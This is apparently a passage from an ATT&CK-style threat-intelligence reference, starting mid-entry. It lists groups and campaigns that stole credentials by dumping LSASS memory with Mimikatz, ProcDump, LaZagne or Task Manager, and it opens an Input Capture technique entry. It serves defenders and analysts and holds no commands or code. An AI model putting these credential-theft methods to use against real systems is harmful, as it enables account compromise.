regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function. Group 'Kimsuky': Kimsuky has gathered credentials using Mimikatz and ProcDump. Group 'Play': Play has used Mimikatz and the Windows Task Manager to dump LSASS process memory. Group 'RedCurl': RedCurl used LaZagne to obtain passwords from memory. Group 'TEMP.Veles': In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz.During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials. Campaign 'Operation Wocao': During Operation Wocao, threat actors used ProcDump to dump credentials from memory. Campaign 'Cutting Edge': During Cutting Edge, threat actors used Task Manager to dump LSASS memory from Windows devices to disk. Campaign 'SharePoint ToolShell Exploitation': During SharePoint ToolShell Exploitation, threat actors used Mimikatz to dump LSASS memory. Campaign 'Operation Digital Eye': During Operation Digital Eye, threat actors targeted memory from the LSASS process to extract credentials. Campaign 'Triton Safety Instrumented System Attack': In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz. Campaign 'HomeLand Justice': During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts. Campaign '2025 Poland Wiper Attacks': During the 2025 Poland Wiper Attacks, the adversaries attempted to dump credentials utilizing LSASS. Campaign '2016 Ukraine Electric Power Attack': During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials. Campaign 'C0032': During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials.

T1056.name: Input Capture
T1056.description: Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes.
